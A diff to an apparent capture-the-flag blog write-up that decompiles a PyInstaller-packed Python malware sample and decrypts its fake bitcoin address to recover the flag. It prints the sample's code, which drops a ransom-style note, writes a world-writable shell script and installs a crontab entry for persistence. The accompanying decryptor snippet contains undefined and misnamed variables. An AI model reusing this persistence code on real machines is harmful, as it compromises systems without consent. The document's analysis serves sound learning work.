@@ -254,6 +254,8 @@ Also it writes a message to `/var/message.txt` containing:
 
 ![Image](https://eqqn.github.io/images/ace_btc.JPG)
 
+It is not really an address but decoding returns random data.
+
 #### decompiling the pyc files with uncompyle6
 
 ![Image](https://eqqn.github.io/images/ace_folders.JPG)
@@ -268,8 +270,70 @@ Hacktricks had some notes on python decompilation and it was different from what
 
 https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/.pyc
 
-`pyi-archive_viewer` worked so well, and I was looking at a python archive all along.
+`pyi-archive_viewer` worked so well, and I was looking at a python archive all along. Analyze the file type first!
 
+![Image](https://eqqn.github.io/images/ace_pyi.png)
+
+I extracted some files, some already seen before. I also pointed it to the "extracted_malware" block, and it contained the malware code, obfuscated.
+
+![Image](https://eqqn.github.io/images/ace_hexed.png)
+
+Unhex the code with Cyberchefand you get
+
+```python
+#import ctypes
+import subprocess
+def encrypt(plain):
+	try:
+		import Cryptodome.Cipher.AES as aes
+		import base64
+		cipher = aes.new(b"verylonglongkeyy", aes.MODE_CFB, iv=b"1234567890987654")
+		ciphered_data = cipher.encrypt(plain.encode())
+		print(base64.b64encode(ciphered_data))
+	except:
+		print("[-] Error")
+
+def main():
+	with open("/var/message.txt", "w") as k:
+		k.write("""PWNED AND HERE'S MY BTC ADDRESS: 1j9kKMjZm7+1EAAo9z6ff1a1uMgqaRgrsg==""")
+	with open("/var/hidden.sh", "w") as d:
+		d.write("wall -n $(cat message.txt)")
+	exet = subprocess.getoutput(b"chmod 777 /var/hidden.sh; echo '*/5 * * * * /bin/bash /root/hidden.sh' | crontab -")
+	#com.evil(ctypes.c_char_p(b"id"))
+	with open("readme.txt", "w") as f:
+		f.write("PWNED AND PERSISTED >:)")
+	print(">:)")
+
+if __name__ == '__main__':
+	main()
+```
+
+In addition to the observed behaviours, we also see encryption algorithm. Here the only base64 encoded string is the "BTC address".
+
+We have the key,IV, AES-CFB cipher, so all we need is to write a decryptor.
+
+```python
+import base64
+from Crypto.Cipher import AES
+
+cipher = aes.new(b"verylonglongkeyy", aes.MODE_CFB, iv=b"1234567890987654")
+#ciphertext = encryption_cipher.encrypt(input_data)
+
+b64_ciphertext = base64.b64encode(ciphertext).decode()
+print("Base64 of AES-encrypted message: ", b64_ciphertext)
+
+## DECRYPTION
+b64_ciphertext="1j9kKMjZm7+1EAAo9z6ff1a1uMgqaRgrsg=="
+unb64_ciphertext = base64.b64decode(b64_ciphertext.encode())
+output_data = cipher.decrypt(unb64_ciphertext)
+
+print("Decrypted message: ", output_data)
+```
+
+> flag{C0mpL1c4t3d_m4Lw4r3}
+
+Decryption based on https://stackoverflow.com/questions/72111390/is-it-possible-to-decrypt-a-base-64-text-with-a-key-and-aes-standard 
+because the 2nd encode() operation instead of decode() was not something obvious or intuitive to me. 
 
 
 triton malware mention. f-secure blog link? 
@@ -278,6 +342,9 @@ https://blog.f-secure.com/how-to-decompile-any-python-binary/
     
 https://www.mandiant.com/resources/blog/attackers-deploy-new-ics-attack-framework-triton
     
+
+### Acknowledgements
+
 
 
 
